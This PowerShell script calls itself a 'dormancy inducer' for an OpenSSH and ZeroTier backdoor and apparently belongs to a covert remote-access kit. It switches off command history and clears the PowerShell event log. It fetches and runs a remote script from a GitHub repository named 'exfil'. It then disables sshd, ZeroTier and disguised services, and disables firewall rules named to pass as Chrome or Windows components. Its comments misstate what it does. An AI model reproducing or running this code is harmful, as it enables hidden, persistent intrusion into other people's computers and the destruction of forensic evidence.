<# openssh and zerotier dormancy inducer. #>
# variables
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$ztnethandler = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/ZeroTierStuff/ZtNetJoinLeaveHandler.ps1"
$serviceset = @("ZeroTierOneService", "IP Core Helper", "ssh-agent", "sshd")
$ruleset = @("ZeroTier One", "ZeroTier x64 Binary In", "ZeroTier UDP/9993 In", "Google Chrome Core Service", "Windows Runtime Broker")

# rejoining the zt network.
Invoke-Expression (Invoke-WebRequest -Uri $ztnethandler -UseBasicParsing).Content

# enabling services
foreach ($service in $serviceset) {
    $serviceObject = Get-Service -Name $service
    if ($serviceObject) {
        if ($serviceObject.Status -eq 'Running') {
            Stop-Service -Name $service
        }
        Set-Service -Name $service -StartupType Disabled
    } else {
    }
}

# enabling firewall rules.
foreach ($rule in $ruleset) {
    netsh advfirewall firewall set rule name="$rule" new enable=no *> $null
}